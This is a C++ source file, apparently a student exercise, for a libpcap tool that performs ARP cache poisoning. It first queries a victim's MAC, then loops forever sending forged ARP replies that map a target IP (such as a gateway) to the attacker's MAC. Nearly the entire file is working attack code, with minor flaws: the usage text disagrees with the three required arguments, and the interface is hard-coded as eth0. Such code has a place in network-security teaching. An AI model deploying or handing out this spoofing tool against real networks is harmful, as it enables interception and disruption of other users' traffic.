#include "stdafx.h"
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)

#define HWADDR_len 6

struct EthArpPacket final { // https://nirsa.tistory.com/27 arp header
    EthHdr eth_; // 14 byte
    ArpHdr arp_; // 28 byte
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void get_my_mac(uint8_t MAC_str[])
{
    // Or I can find my mac address in /sys/class/net(Linux)
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, "eth0");
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i < HWADDR_len; i++)
        MAC_str[i] = ((uint8_t*)ifr.ifr_hwaddr.sa_data)[i];
}

void get_sender_mac(uint8_t attacker_mac[], uint8_t sender_mac[], EthArpPacket L2_arp_packet,
                    uint32_t target_ip, uint32_t sender_ip, pcap_t* handle){
    // send arp request
    L2_arp_packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    L2_arp_packet.eth_.smac_ = Mac(attacker_mac);
    L2_arp_packet.eth_.type_ = htons(EthHdr::Arp);

    L2_arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    L2_arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
    L2_arp_packet.arp_.hln_ = Mac::SIZE;
    L2_arp_packet.arp_.pln_ = Ip::SIZE;
    L2_arp_packet.arp_.op_ = htons(ArpHdr::Request); // Request: 1, Reply: 2
    L2_arp_packet.arp_.smac_ = Mac(attacker_mac);
    L2_arp_packet.arp_.sip_ = htonl(Ip(target_ip));
    L2_arp_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    L2_arp_packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&L2_arp_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // get arp reply
    struct pcap_pkthdr* header;
    struct libnet_ethernet_hdr *L2_hdr;
    struct ArpHdr *L_under_3_hdr;
    const u_char* packet;

    while (true){
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        L2_hdr = (struct libnet_ethernet_hdr*)(packet);
        if (ntohs(L2_hdr->ether_type) == ETHERTYPE_ARP){
            // Check Ethernet if the upper protocol is arp
            L_under_3_hdr = (struct ArpHdr*)(packet + 14);
        }
        else
            continue;

        //  Check if src ip, dst ip and dst mac are right
        if (Mac(L2_hdr->ether_dhost) == Mac(attacker_mac) &&
                ntohl(Ip(L_under_3_hdr->sip_)) == Ip(sender_ip) &&
                ntohl(Ip(L_under_3_hdr->tip_)) == Ip(target_ip)) {
            for (int i=0; i < HWADDR_len; i++){
                sender_mac[i] = L2_hdr->ether_shost[i];
                printf("%x ", sender_mac[i]);
            }
            break;
        }
    }
}

void send_forfeit_packet(uint8_t attacker_mac[], uint8_t sender_mac[], EthArpPacket L2_arp_packet,
                    uint32_t target_ip, uint32_t sender_ip, pcap_t* handle){
    while(true){
        // send arp reply
        L2_arp_packet.eth_.dmac_ = Mac(sender_mac);
        L2_arp_packet.eth_.smac_ = Mac(attacker_mac);
        L2_arp_packet.eth_.type_ = htons(EthHdr::Arp);

        L2_arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        L2_arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
        L2_arp_packet.arp_.hln_ = Mac::SIZE;
        L2_arp_packet.arp_.pln_ = Ip::SIZE;
        L2_arp_packet.arp_.op_ = htons(ArpHdr::Reply); // Request: 1, Reply: 2
        L2_arp_packet.arp_.smac_ = Mac(attacker_mac);
        L2_arp_packet.arp_.sip_ = htonl(Ip(target_ip));
        L2_arp_packet.arp_.tmac_ = Mac(sender_mac);
        L2_arp_packet.arp_.tip_ = htonl(Ip(sender_ip));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&L2_arp_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        sleep(1);
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    // device, bufsize(8192), promisc, timestop(after capturing packet), errbuf
    //this handle can handle reading and writing
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

    // check if the device provides Ethernet header
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
        return -1;
    }

    // no use victim and gateway
    uint32_t sender_ip = Ip(argv[2]);
    uint32_t target_ip = Ip(argv[3]);
    uint8_t attacker_mac[HWADDR_len], sender_mac[HWADDR_len];
    EthArpPacket L2_arp_packet;

    get_my_mac(attacker_mac);
    get_sender_mac(attacker_mac, sender_mac, L2_arp_packet, target_ip, sender_ip, handle);

    printf("send forfeit packet\n");
    send_forfeit_packet(attacker_mac, sender_mac, L2_arp_packet, target_ip, sender_ip, handle);

	pcap_close(handle);

    return 0;
}
